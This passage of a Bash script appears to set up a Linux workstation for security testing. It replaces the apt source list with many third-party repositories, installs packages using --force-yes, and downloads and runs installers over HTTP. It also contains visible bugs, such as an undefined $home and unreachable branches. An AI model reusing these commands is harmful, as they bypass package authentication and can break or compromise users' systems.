#!/bin/bash

LOG="$home/errorinstallation.log"
users=$(ls /home/*)
file="/root/file"

# Time Elapsed Functions
timelapsed () {

	k=1
	until [ -e $home/pio.txt ]; do
		sleep 1
		if [ $k -lt 10 ]; then
			echo -en  "[$k s]\b\b\b\b\b\c"
		elif [ $k -ge 10 ]; then
			echo -en  "[$k s]\b\b\b\b\b\b\c"
		elif [ $k -ge 100 ]; then
			echo -en  "[$k s]\b\b\b\b\b\b\b\c"
		elif [ $k -ge 1000 ]; then
			echo -en  "[$k s]\b\b\b\b\b\b\b\b\c"
		elif [ $k -ge 10000 ]; then
			echo -en  "[$k s]\b\b\b\b\b\b\b\b\b\c"
		else [ $k -ge 100000 ]
			echo -en  "[$k s]\b\b\b\b\b\b\b\b\b\b\c"
		fi
		k=$[ $k + 1 ]
	done
	# use:
	# echo -n "what i am doing "
	# timelapsed &
	# operation ...
	# time_stop

}

time_stop () {

	touch $home/pio.txt
	sleep 1
	rm -f $home/pio.txt
	echo ""

}



# Truecrypt Console
f_truecrypt () {

echo "[*] Installing TrueCrypt"

cd /opt

echo "    - Downloading Source ... "
wget http://www.truecrypt.org/download/truecrypt-7.1-linux-console-x86.tar.gz 1> /dev/null

echo "    - Uncompressing ... "
tar xfvz truecrypt-7.1-linux-console-x86.tar.gz 1> /dev/null

echo "    - Installing ... "
bash truecrypt-7.1-setup-console-x86

echo "    - Deletting Source ... "
rm -f truecrypt-7.1-setup-console-x86
rm -f truecrypt-7.1-linux-console-x86.tar.gz

cd $home

cp "usr/share/truecrypt/doc/TrueCrypt User Guide.pdf" $home/Truecrypt.pdf

}



# Java
f_java_buntu () {

echo "[*] Java ..."

rm -f /etc/apt/sources.list
echo "# Repository Ubuntu [Utopic]
deb http://it.archive.ubuntu.com/ubuntu/ utopic main restricted
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic main restricted
deb http://it.archive.ubuntu.com/ubuntu/ utopic universe
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic universe
deb http://it.archive.ubuntu.com/ubuntu/ utopic-updates universe
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic-updates universe
deb http://it.archive.ubuntu.com/ubuntu/ utopic multiverse
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic multiverse
deb http://it.archive.ubuntu.com/ubuntu/ utopic-updates multiverse
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic-updates multiverse
deb http://archive.canonical.com/ubuntu utopic partner
deb-src http://archive.canonical.com/ubuntu utopic partner
deb http://it.archive.ubuntu.com/ubuntu/ utopic-backports main restricted universe multiverse
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic-backports main restricted universe multiverse
deb http://security.ubuntu.com/ubuntu utopic-security main restricted
deb-src http://security.ubuntu.com/ubuntu utopic-security main restricted
deb http://security.ubuntu.com/ubuntu utopic-security universe
deb-src http://security.ubuntu.com/ubuntu utopic-security universe
deb http://security.ubuntu.com/ubuntu utopic-security multiverse
deb-src http://security.ubuntu.com/ubuntu utopic-security multiverse" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list

echo "    - Apt-Get Update ... "
apt-get update 1> /dev/null 2> $LOG

echo "    - Installing Java ... "
apt-get install -y --force-yes sun-java6-jre sun-java6-jdk 2> $LOG

}

f_java_debian () {

echo "[*] Java ..."

rm -f /etc/apt/sources.list
touch /etc/apt/sources.list
echo "# Debian Unstable (Sid)
deb http://ftp.it.debian.org/debian/ sid main non-free contrib
deb-src http://ftp.it.debian.org/debian/ sid main non-free contrib
" >> /etc/apt/sources.list

echo "    - Apt-Get Update ... "
apt-get update 1> /dev/null 2> $LOG

echo "    - Installing Java ... "
apt-get install -y --force-yes sun-java6-jre sun-java6-jdk 2> $LOG

}



# Axel Download Manager
f_axel_buntu_debian () {

echo -n "[*] Installing Axel Download Manager ... "

timelapsed &

apt-get install -y --force-yes axel 1> /dev/null 2> $LOG

time_stop

}



# Repository
f_repo_buntu () {

echo -n "[*] Repositories "

echo ""

timelapsed &

echo ""

echo -n "    - Replacing Sources.list ... "
echo ""

# Cleaning sources.list
sudo rm /etc/apt/sources.list
sudo touch /etc/apt/sources.list
sudo chmod 775 /etc/apt/sources.list


# Repository Ubuntu Utopic (Base+Universe+Multiverse+Canonical+Backports)
echo -n "      - Added Ubuntu Repositories (Utopic) ... "
echo "# Repository Ubuntu [Utopic]
deb http://it.archive.ubuntu.com/ubuntu/ utopic main restricted
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic main restricted
deb http://it.archive.ubuntu.com/ubuntu/ utopic universe
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic universe
deb http://it.archive.ubuntu.com/ubuntu/ utopic-updates universe
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic-updates universe
deb http://it.archive.ubuntu.com/ubuntu/ utopic multiverse
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic multiverse
deb http://it.archive.ubuntu.com/ubuntu/ utopic-updates multiverse
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic-updates multiverse
deb http://archive.canonical.com/ubuntu utopic partner
deb-src http://archive.canonical.com/ubuntu utopic partner
deb http://it.archive.ubuntu.com/ubuntu/ utopic-backports main restricted universe multiverse
deb-src http://it.archive.ubuntu.com/ubuntu/ utopic-backports main restricted universe multiverse
deb http://security.ubuntu.com/ubuntu utopic-security main restricted
deb-src http://security.ubuntu.com/ubuntu utopic-security main restricted
deb http://security.ubuntu.com/ubuntu utopic-security universe
deb-src http://security.ubuntu.com/ubuntu utopic-security universe
deb http://security.ubuntu.com/ubuntu utopic-security multiverse
deb-src http://security.ubuntu.com/ubuntu utopic-security multiverse" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo ""


# Repository GetDeb
echo -n "      - Added GetDeb Repositories ... "
echo "# Repository GetDeb
deb http://archive.getdeb.net/ubuntu utopic-getdeb apps" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
wget -q -O- http://archive.getdeb.net/getdeb-archive.key | sudo apt-key add - 1> /dev/null 2> $LOG
echo ""



# Repository PlayDeb
echo -n "      - Added PlayDeb Repositories ... "
echo "# Repository PlayDeb
deb http://archive.getdeb.net/ubuntu utopic-getdeb games" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
wget -q -O- http://archive.getdeb.net/getdeb-archive.key | sudo apt-key add - 1> /dev/null 2> $LOG
echo ""


# Repository Tualatrix (UbuntuTweak)
echo -n "      - Added Tualatrix Repositories (Ubuntu Tweak) ... "
echo "# Repository Tualatrix (UbuntuTweak)
deb http://ppa.launchpad.net/tualatrix/next/ubuntu utopic main
deb-src http://ppa.launchpad.net/tualatrix/next/ubuntu utopic main" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com FE85409EEAB40ECCB65740816AF0E1940624A220 1> /dev/null 2> $LOG
echo ""


# Repository HandBrake
echo -n "      - Added HandBrake Repositories ... "
echo "# Repository HandBrake
deb http://ppa.launchpad.net/stebbins/handbrake-releases/ubuntu raring main
deb-src http://ppa.launchpad.net/stebbins/handbrake-releases/ubuntu raring main" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 816950D8 1> /dev/null 2> $LOG
echo ""


# Repository Tor
echo -n "      - Added Tor Repositories ... "
echo "# Repository Tor
deb http://deb.torproject.org/torproject.org saucy main" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 886DDD89 1> /dev/null 2> $LOG
echo ""


# Repository Remastersys
echo -n "      - Added RematerSys Repositories ... "
echo "# Repository Remastersys
deb http://www.geekconnection.org/remastersys/repository karmic/" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo ""


# Repository Firefox 4
echo -n "      - Added Firefox Repositories ... "
echo "# Repository Firefox 4
deb http://ppa.launchpad.net/ubuntu-mozilla-daily/ppa/ubuntu saucy main
deb-src http://ppa.launchpad.net/ubuntu-mozilla-daily/ppa/ubuntu saucy main" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 247510BE 1> /dev/null 2> $LOG
echo ""


# Repository Opera
echo -n "      - Added Opera Repositories ... "
echo "# Repository Opera
deb http://deb.opera.com/opera/ stable non-free" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
wget -q -O- http://deb.opera.com/archive.key | sudo apt-key add - 1> /dev/null 2> $LOG
echo ""


# Midori
echo -n "      - Added Midori Repositories ... "
echo "# Midori
deb http://ppa.launchpad.net/midori/ppa/ubuntu saucy main
deb-src http://ppa.launchpad.net/midori/ppa/ubuntu saucy main" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A69241F1 1> /dev/null 2> $LOG
echo ""


# Repository I-Next (System Hardware Info)
echo -n "      - Added I-Next Repositories (System Hardware Info) ... "
echo "# Repository I-Next (System Hardware Info)
deb http://ppa.launchpad.net/i-nex-development-team/stable/ubuntu utopic main
deb-src http://ppa.launchpad.net/i-nex-development-team/stable/ubuntu utopic main" >> /etc/apt/sources.list
echo ""  >> /etc/apt/sources.list
echo ""  >> /etc/apt/sources.list
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys F34CDDAD 1> /dev/null 2> $LOG
echo ""


# Repository Conky-Companions
echo -n "      - Added Conky-Companions Repositories ... "
echo "# Repository Conky-Companions
deb http://ppa.launchpad.net/conky-companions/ppa/ubuntu quantal main
deb-src http://ppa.launchpad.net/conky-companions/ppa/ubuntu quantal main" >> /etc/apt/sources.list
echo ""  >> /etc/apt/sources.list
echo ""  >> /etc/apt/sources.list
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 9BF2D8AB 1> /dev/null 2> $LOG
echo ""


# Repository Cairo-Dock
echo -n "      - Added Cairo-Dock Repositories ... "
echo "# Repository Cairo-Dock
deb http://ppa.launchpad.net/cairo-dock-team/ppa/ubuntu utopic main
deb-src http://ppa.launchpad.net/cairo-dock-team/ppa/ubuntu utopic main" >> /etc/apt/sources.list
echo ""  >> /etc/apt/sources.list
echo ""  >> /etc/apt/sources.list
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys E80D6BF5 1> /dev/null 2> $LOG
echo ""
# sudo apt-get install -y --force-yes cairo-dock cairo-dock-plug-ins


# Repository AWN
echo -n "      - Added Awn Repositories ... "
echo "# Repository AWN
deb http://ppa.launchpad.net/awn-testing/ppa/ubuntu saucy main" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BF810CD5 1> /dev/null 2> $LOG
echo ""


# Repository Virtualbox
echo -n "      - Added VirtualBox Repositories ... "
echo "# Repository Virtualbox
deb http://download.virtualbox.org/virtualbox/debian trusty non-free" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
wget -q -O- http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc | sudo apt-key add - 1> /dev/null 2> $LOG
echo ""


# Repository Akirad (Cinelerra)
echo -n "      - Added Akirad Repositories (Cinelerra) ... "
echo "# Repository Akirad (Cinelerra)
deb http://ppa.launchpad.net/akirad/akirad/ubuntu lucid main
deb-src http://ppa.launchpad.net/akirad/akirad/ubuntu lucid main" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
wget -q http://repository.akirad.net/dists/akirad.key -O- | sudo apt-key add - 1> /dev/null 2> $LOG
echo ""


# Update
echo ""
echo -n "    - Updating Repositories ... "
apt-get update 1> /dev/null 2> $LOG
echo ""

 # Upgrade
echo ""
echo -n "    - Upgrading ... "
apt-get upgrade -y --force-yes 1> /dev/null 2> $LOG
apt-get clean 1> /dev/null 2> $LOG
apt-get autoclean 1> /dev/null 2> $LOG
echo ""

# Dist Upgrade
echo ""
echo -n "    - Dist-Upgrading ... "
apt-get dist-upgrade -y --force-yes 1> /dev/null 2> $LOG
echo ""

# Autoremove + Clean
echo ""
echo -n "    - Autoremoving and Cleaning ... "
apt-get clean 1> /dev/null 2> $LOG
apt-get autoclean 1> /dev/null 2> $LOG
apt-get autoremove --purge -y --force-yes 1> /dev/null 2> $LOG
echo ""

time_stop

echo ""
}

f_repo_debian () {

echo -n "[*] Repository"

timelapsed &

rm -f /etc/apt/sources.list
touch /etc/apt/sources.list

echo "# Debian Unstable (Sid)
deb http://ftp.it.debian.org/debian/ sid main non-free contrib
deb-src http://ftp.it.debian.org/debian/ sid main non-free contrib

# Marillat Sid (unstable) Architetture: alpha, amd64, armel, hppa, i386, ia64, mipsel, powerpc, sparc
deb http://www.debian-multimedia.org sid main non-free
deb-src http://www.debian-multimedia.org sid main

# Maxer Multimedia
deb http://repos.knio.it/ sid main contrib non-free
deb-src http://repos.knio.it/ sid main contrib non-free

# HWraid
deb http://hwraid.le-vert.net/debian sid main
deb-src http://hwraid.le-vert.net/debian sid main

# Unofficial Debian Repository
deb http://unofficial.debian-maintainers.org/ sid main contrib non-free restricted
deb-src http://unofficial.debian-maintainers.org/ sid main contrib non-free restricted

# Skype
deb http://download.skype.com/linux/repos/debian/ unstable non-free

# Frostwire
deb http://apt.debianchile.org/frostwire squeeze main
deb-src http://apt.debianchile.org/frostwire squeeze main

# Repository GetDeb
# wget -q -O- http://archive.getdeb.net/getdeb-archive.key | apt-key add -
deb http://archive.getdeb.net/debian sid-getdeb apps

# Java 6 JRE/SDK (From Official Debian Repository)
deb http://ftp.bononia.it/debian unstable main contrib non-free

# Repository Tor
# apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 886DDD89
deb http://deb.torproject.org/torproject.org sid main

# Cairo Comprmg
deb http://download.tuxfamily.org/ccm/debian/ sid main

# VirtualBox
deb http://www.virtualbox.org/debian squeeze non-free

" >> /etc/apt/sources.list

apt-get update 1> /dev/null

# Key Repository GetDeb
echo ""
echo -n "   - Downloading GetDeb Keyserver ... "
wget -q -O- http://archive.getdeb.net/getdeb-archive.key | apt-key add - 1> /dev/null

# Frostwire Key
echo ""
echo -n "   - Downloading Frostwire Keyserver ... "
gpg --keyserver hkp://subkeys.pgp.net --recv-keys EFD17969 1> /dev/null

# Virtualbox Key
echo ""
echo -n "   - Downloading Virtualbox Keyserver ... "
wget -q http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc -O- | apt-key add - 1> /dev/null

# Marillat Key
echo ""
echo "      - Downloading Marillat Keyserver ... "
apt-get install -y --force-yes debian-multimedia-keyring 1> /dev/null

# Update
echo ""
echo -n "   - Updating Repositories ... "
apt-get update 1> /dev/null

# Upgrade
echo ""
echo -n "   - Upgrading ... "
apt-get upgrade -y --force-yes 1> /dev/null 2> $LOG
apt-get clean 1> /dev/null 2> $LOG
apt-get autoclean 1> /dev/null 2> $LOG

echo
echo -n "   - Dist-Upgrading ... "
apt-get dist-upgrade -y --force-yes 1> /dev/null 2> $LOG

# Autoremoving + Cleaning
echo ""
echo -n "   - Autoremoving and Cleaning ... "
apt-get clean 1> /dev/null 2> $LOG
apt-get autoclean 1> /dev/null 2> $LOG
apt-get autoremove --purge -y --force-yes 1> /dev/null 2> $LOG

time_stop

}



# User Dir
f_dir () {

echo -n "[*] Creating Special Dirs ... "

timelapsed &

cd $home
mkdir -p Iso 1> /dev/null
echo "$home/ISO" >> $file
mkdir -p Scripts 1> /dev/null
echo "$home/Scripts" >> $file
mkdir -p .config 1> /dev/null
echo "$home/.config" >> $file
mkdir -p CAP 1> /dev/null
echo "$home/CAP" >> $file
mkdir -p LOG 1> /dev/null
echo "$home/LOG" >> $file
mkdir -p WordList 1> /dev/null
echo "$home/Wordlist" >> $file

cd /opt
mkdir -p darkeffe 1> /dev/null
echo "/opt/darkeffe" >> $file

cd /media
mkdir -p share 1> /dev/null
echo "/media/share" >> $file

cd /
mkdir -p pentest

cd $home

time_stop

}



# Software&librerie Programmazione (build-essentials | subversion | git | libssl-dev | cmake | python | perl | ruby | gtk)
f_programming_libraries_buntu_debian () {

echo "[*] Programming Libraries"

# Build-Essential
f_build_essential () {

echo -n "    - Installing Build-Essential ... "

timelapsed &

apt-get install -y --force-yes build-essential 1> /dev/null 2> $LOG

time_stop

}

f_build_essential

# Pkg-Config
f_pkg_config () {

echo -n "    - Installing Pkg-Config ... "

timelapsed &

apt-get install -y --force-yes pkg-config 1> /dev/null 2> $LOG

time_stop

}

f_pkg_config

# LibTool
f_libtool () {

echo -n "    - Installing LibTool ... "

timelapsed &

apt-get install -y --force-yes libtool 1> /dev/null 2> $LOG

time_stop

}

f_libtool

# Automake
f_automake () {

echo -n "    - Installing Automake ... "

timelapsed &

apt-get install -y --force-yes automake1.9 1> /dev/null 2> $LOG

time_stop

}

f_automake

# Autoconf
f_autoconf () {

echo -n "    - Installing Autoconf ... "

timelapsed &

apt-get install -y --force-yes autoconf 1> /dev/null 2> $LOG

time_stop

}

f_autoconf

# Cmake
f_cmake () {

echo -n "    - Installing Cmake ... "

timelapsed &

apt-get install -y --force-yes cmake 1> /dev/null 2> $LOG

time_stop

}

f_cmake

# Ncurses
f_ncurses () {


echo -n "    - Installing Ncurses ... "

timelapsed &

apt-get install -y --force-yes libncurses 1> /dev/null 2> $LOG
apt-get install -y --force-yes libncurses-dev 1> /dev/null 2> $LOG

time_stop

}

f_ncurses

# Xutilis-Dev
f_xutilis_dev () {

echo -n "    - Installing Xutilis-Dev ... "

timelapsed &

apt-get install -y --force-yes xutilis-dev 1> /dev/null 2> $LOG

time_stop

}

f_xutilis_dev


# Subversion
f_subversion () {

echo -n "    - Installing Subversion ... "

timelapsed &

apt-get install -y --force-yes subversion 1> /dev/null 2> $LOG

time_stop

}

f_subversion

# Mercurial
f_mercurial () {

echo -n "    - Installing Mercurial ... "

timelapsed &

apt-get install -y --force-yes mercurial 1> /dev/null 2> $LOG

time_stop

}

f_mercurial

# Git
f_git () {

echo -n "    - Installing Git ... "

timelapsed &

apt-get install -y --force-yes git 1> /dev/null 2> $LOG

time_stop

}

f_git

# Python
f_python () {

echo -n "    - Installing Python ... "

timelapsed &

apt-get install -y --force-yes python 1> /dev/null 2> $LOG
apt-get install -y --force-yes python-dev 1> /dev/null 2> $LOG
apt-get install -y --force-yes python-crypto 1> /dev/null 2> $LOG
apt-get install -y --force-yes python-scapy 1> /dev/null 2> $LOG
apt-get install -y --force-yes python-sqlite 1> /dev/null 2> $LOG
apt-get install -y --force-yes python-biopython1> /dev/null 2> $LOG
apt-get install -y --force-yes python-twisted-web 1> /dev/null 2> $LOG
apt-get install -y --force-yes python-qt4 1> /dev/null 2> $LOG
apt-get install -y --force-yes python-gmpy 1> /dev/null 2> $LOG
apt-get install -y --force-yes python-psycopg2 1> /dev/null 2> $LOG
apt-get install -y --force-yes python-qscintilla2 1> /dev/null 2> $LOG

time_stop

}

f_python

# Perl
f_perl () {

echo -n "    - Installing Perl ... "

timelapsed &

apt-get install -y --force-yes perl 1> /dev/null 2> $LOG
apt-get install -y --force-yes libnet-dns-perl 1> /dev/null $LOG
apt-get install -y --force-yes libnet-pcap-perl 1> /dev/null 2> $LOG
apt-get install -y --force-yes libio-socket-ssl-perl 1> /dev/null 2> $LOG
apt-get install -y --force-yes libnet-rawip-perl 1> /dev/null 2> $LOG
apt-get install -y --force-yes libnetpacket-perl 1> /dev/null 2> $LOG

time_stop

}

f_perl

# Ruby
f_ruby () {

echo -n "    - Installing Ruby & Rubygems ... "

timelapsed &

apt-get install -y --force-yes ruby-full 1> /dev/null 2> $LOG
apt-get install -y --force-yes rubygems 1> /dev/null 2> $LOG
apt-get install -y --force-yes libruby  1> /dev/null 2> $LOG
apt-get install -y --force-yes ri 1> /dev/null 2> $LOG
apt-get install -y --force-yes ruby-dev 1> /dev/null 2> $LOG
apt-get install -y --force-yes libpcap-ruby 1> /dev/null 2> $LOG

time_stop

}

f_ruby

# Gettext
f_gettext () {

echo -n "    - Installing Gettext ... "

timelapsed &

apt-get install -y --force-yes gettext  1> /dev/null 2> $LOG

time_stop

}

f_gettext

# LibSsl-Dev
f_libssl_dev () {

echo -n "    - Installing LibSsl-Dev ... "

timelapsed &

apt-get install -y --force-yes libssl-dev 1> /dev/null 2> $LOG

time_stop

}

f_libssl_dev

# Lib Pcap-Dev
f_lib_pcap_dev () {

echo -n "    - Installing LibPcap-Dev ... "

timelapsed &

apt-get install -y --force-yes libpcap-dev 1> /dev/null 2> $LOG

time_stop

}

f_lib_pcap_dev

# Lib Net-Dev
f_lib_net_dev () {

echo -n "    - Installing libNet-Dev ... "

timelapsed &

apt-get install -y --force-yes libnet-dev 1> /dev/null 2> $LOG

time_stop

}

f_lib_net_dev

# ZLib1g
f_zlib1g () {

echo -n "    - Installing Zlib1g ... "

timelapsed &

apt-get install -y --force-yes zlib1g 1> /dev/null 2> $LOG

time_stop

}

f_zlib1g

cd $home

}


# Sviluppo Software (eclipse | glade)
f_sviluppo_software () {

echo "[*] Programming Libraries"

f_eclipse () {

	echo -n "    - Installing Eclipse ... "

	timelapsed &

	apt-get install -y --force-yes build-essential 1> /dev/null 2> $LOG # Gcc + Make
	apt-get install -y --force-yes g++ 1> /dev/null 2> $LOG # Compilatore C++

	apt-get install -y --force-yes eclipse 1> /dev/null 2> $LOG # Java
	apt-get install -y --force-yes eclipse-cdt 1> /dev/null 2> $LOG # C/C++
	apt-get install -y --force-yes eclipse-xsd 1> /dev/null 2> $LOG # XML

	touch $home/pio.txt
	sleep 1
	rm -f $home/pio.txt
	echo ""

}

f_eclipse

f_android_SDK () {

	echo -n "    - Installing Android_SDK ... "

	timelapsed &

	axel http://dl.google.com/android/android-sdk_r20-linux.tgz 1> /dev/null

	tar xvfz android-sdk_r20-linux.tgz

	cd android-sdk-linux

	cd ..

	rm -f android-sdk_r20-linux.tgz

	cd $home

	touch $home/pio.txt
	sleep 1
	rm -f $home/pio.txt
	echo ""

}

f_android_SDK &

sleep 3

f_pkg_config () {

echo -n "    - Installing Pkg-Config ... "

timelapsed &

apt-get install -y --force-yes pkg-config 1> /dev/null 2> $LOG

time_stop

}

f_pkg_config

f_lib_gtk_dev () {

echo -n "    - Installing LibGtk ... "

timelapsed &

apt-get install -y --force-yes libgtk2.0-dev 1> /dev/null 2> $LOG

time_stop

}

f_lib_gtk_dev

f_glade () {

	echo -n "    - Installing Glade ... "

	timelapsed &

	apt-get install -y --force-yes glade 1> /dev/null 2> $LOG
	apt-get install -y --force-yes python-gtk2 python-glade2 1> /dev/null 2> $LOG

	touch $home/pio.txt
	sleep 1
	rm -f $home/pio.txt
	echo ""

}

f_glade

}


# Compressor
f_compressor_buntu_debian () {

echo "[***] Compressors ... "

# Tar
f_tar () {

echo -n "  [*] Installing Tar ... "

timelapsed &

apt-get install -y --force-yes tar 1> /dev/null 2> $LOG

time_stop

}

f_tar

# Bzip2
f_bzip2 () {

echo -n "  [*] Installing Bzip2 ... "

timelapsed &

apt-get install -y --force-yes bzip2 1> /dev/null 2> $LOG

time_stop

}

f_bzip2

# Zip
f_zip () {

echo -n "  [*] Installing Zip ... "

timelapsed &

apt-get install -y --force-yes zip unzip 1> /dev/null 2> $LOG

time_stop

}

f_zip

# Rar
f_rar () {

echo -n "  [*] Installing Rar ... "

timelapsed &

apt-get install -y --force-yes rar unrar 1> /dev/null 2> $LOG

time_stop

}

f_rar

# 7Zip
f_7zip () {

echo -n "  [*] Installing 7z ... "

timelapsed &

apt-get install -y --force-yes lzma 1> /dev/null 2> $LOG

time_stop

}

f_7zip

# Cab Extractor
f_cab_extractor () {

echo -n "  [*] Installing Cab Extractor ... "

timelapsed &

apt-get install -y --force-yes cabextract 1> /dev/null 2> $LOG

time_stop

}

f_cab_extractor

cd $home

}


# Firmware
f_firmware_buntu () {

echo "[***] Firmware"

# Atmel Firmware
f_atmel_firmware () {

echo -n "  [*] Installing Atmel-Firmware ... "

timelapsed &

apt-get install -y --force-yes atmel-firmware 1> /dev/null 2> $LOG

time_stop

}

f_atmel_firmware

# Hpijs
f_hpijs () {

echo -n "  [*] Installing Hpijs ... "

timelapsed &

apt-get install -y --force-yes hpijs 1> /dev/null 2> $LOG

time_stop

}

f_hpijs

# Libertas Firmware
f_libertas_firmware () {

echo -n "  [*] Installing Libertas WiFi Firmware ... "

timelapsed &

apt-get install -y --force-yes libertas-firmware 1> /dev/null 2> $LOG

time_stop

}

f_libertas_firmware

# Linux-Wlan-ng
f_linux_wlan_ng () {

echo -n "  [*] Installing Linux-Wlan-Ng ... "

timelapsed &

apt-get install -y --force-yes linux-wlan-ng 1> /dev/null 2> $LOG

time_stop

}

f_linux_wlan_ng

# Linux Firmware
f_linux_firmware () {

echo -n "  [*] Installing Linux-Firmware ... "

timelapsed &

apt-get install -y --force-yes linux-firmware 1> /dev/null 2> $LOG

time_stop

}

f_linux_firmware

# Linux Firmware NonFree
f_linux_firmware_nonfree () {

echo -n "  [*] Installing Linux-Firmware-Nonfree ... "

timelapsed &

apt-get install -y --force-yes linux-firmware-nonfree 1> /dev/null 2> $LOG

time_stop

}

f_linux_firmware_nonfree

# Alsa Firmware
f_alsa_firmware () {

echo -n "  [*] Installing Alsa-Firmware ... "

timelapsed &

apt-get install -y --force-yes alsa-firmware 1> /dev/null 2> $LOG

time_stop

}

f_alsa_firmware

cd $home

}

f_firmware_debian () {

echo "[***] Firmware"

# Atmel Firmware
f_atmel_firmware () {

echo -n "  [*] Installing Atmel-Firmware ... "

timelapsed &

apt-get install -y --force-yes atmel-firmware 1> /dev/null 2> $LOG

time_stop

}

f_atmel_firmware

# Hpijs
f_hpijs () {

echo -n "  [*] Installing Hpijs ... "

timelapsed &

apt-get install -y --force-yes hpijs 1> /dev/null 2> $LOG

time_stop

}

f_hpijs

# Libertas Firmware
f_libertas_firmware () {

echo -n "  [*] Installing Libertas WiFi Firmware ... "

timelapsed &

apt-get install -y --force-yes libertas-firmware 1> /dev/null 2> $LOG

time_stop

}

f_libertas_firmware

# Linux-Wlan-ng
f_linux_wlan_ng () {

echo -n "  [*] Installing Linux-Wlan-Ng ... "

timelapsed &

apt-get install -y --force-yes linux-wlan-ng 1> /dev/null 2> $LOG

time_stop

}

f_linux_wlan_ng

# Atheros Wifi Firmware
f_atheros_wifi_firmware () {

echo -n "  [*] Installing Atheros WiFi Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-atheros 1> /dev/null 2> $LOG

time_stop

}

f_atheros_wifi_firmware

# Broadcom NetXtremeII Firmware
f_broadcom_netxtreme_II_firmware () {

echo -n "  [*] Installing Broadcom NetXtremeII Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-bnx2 1> /dev/null 2> $LOG

time_stop

}

f_broadcom_netxtreme_II_firmware

# Bluez Firmware
f_bluez_firmware () {

echo -n "  [*] Installing Bluez Firmware ... "

timelapsed &

apt-get install -y --force-yes bluez-firmware 1> /dev/null 2> $LOG

time_stop

}

f_bluez_firmware

# Intel Wimax Firmware
f_intel_wimax_firmware () {

echo -n "  [*] Installing IntelWimax Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-intelwimax 1> /dev/null 2> $LOG

time_stop

}

f_intel_wimax_firmware

# Intel Pro Wireless
f_intel_pro_wireless_2100_2200_2915_firmware () {

echo -n "  [*] Installing Intel Pro Wireless 2100, 2200 and 2915 Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-piw2x00s 1> /dev/null 2> $LOG

time_stop

}

f_intel_pro_wireless_2100_2200_2915_firmware

# iTVC15-Family Firmware
f_itvc15_firmwware () {

echo -n "  [*] Installing iTVC15-family Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-ivtv 1> /dev/null 2> $LOG

time_stop

}

f_itvc15_firmwware

# Intel Wireless 3945 4965 5000 Firmware
f_intel_wireless_3945_4965_5000_firmware () {

echo -n "  [*] Installing Intel Wireless 3945, 4965 and 5000 Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-iwlwifi 1> /dev/null 2> $LOG

time_stop

}

f_intel_wireless_3945_4965_5000_firmware

# Linux Free Firmware
f_linux_free_firmware () {

echo -n "  [*] Installing Linux-Free Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-linux-free 1> /dev/null 2> $LOG

time_stop

}

f_linux_free_firmware

# Linux NonFree Firmware
f_linux_nonfree_firmware () {

echo -n "  [*] Installing Linux-Non-Free Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-linux-nonfree 1> /dev/null 2> $LOG

time_stop

}

f_linux_nonfree_firmware

# Myri-10G Ethernet Firmware
f_myri_10G_ethernet_firmware () {

echo -n "  [*] Installing Myri-10G Ethernet Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-myricom 1> /dev/null 2> $LOG

time_stop

}

f_myri_10G_ethernet_firmware

# Qlogic Intelligent Ethernet
f_qlogic_ethernet () {

echo -n "  [*] Installing QLogic Intelligent Ethernet (3000/3100) Firmware ... "

timelapsed &

apt-get install -y --force-yes firmware-netxen 1> /dev/null 2> $LOG

time_stop

}

f_qlogic_ethernet

# QLogic IBA7220 QLA1xxx ISP2xxx SP2x2 Firmware
f_QLogic_IBA7220_QLA1xxx_ISP2xxx_SP2x2_Firmware () {

